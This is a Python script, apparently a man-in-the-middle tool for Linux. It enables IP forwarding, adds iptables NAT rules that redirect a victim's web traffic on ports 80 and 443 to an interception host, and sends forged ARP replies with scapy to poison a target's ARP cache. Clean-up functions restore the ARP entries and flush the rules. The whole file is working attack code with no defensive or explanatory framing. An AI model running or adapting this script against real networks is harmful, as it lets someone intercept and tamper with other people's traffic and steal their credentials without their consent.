# mitm_linux.py
import subprocess
import scapy.all as scapy
import time
import signal
import sys

def enable_ip_forward():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")

def setup_iptables(redirect_ip):
    cmds = [
        ["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", f"{redirect_ip}:8080"],
        ["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", f"{redirect_ip}:8443"],
        ["iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"],
    ]
    for cmd in cmds:
        subprocess.run(cmd, check=True)

def clear_iptables():
    subprocess.run(["iptables", "-t", "nat", "-F"], check=False)

def spoof(target_ip, spoof_ip, attacker_mac, target_mac=None, iface=None):
    if not target_mac:
        target_mac = scapy.getmacbyip(target_ip)
    if not target_mac:
        return False
    pkt = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    scapy.send(pkt, verbose=False, iface=iface)
    return True

def restore(target_ip, real_ip, target_mac, real_mac, iface=None):
    pkt = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac)
    scapy.send(pkt, count=4, verbose=False, iface=iface)
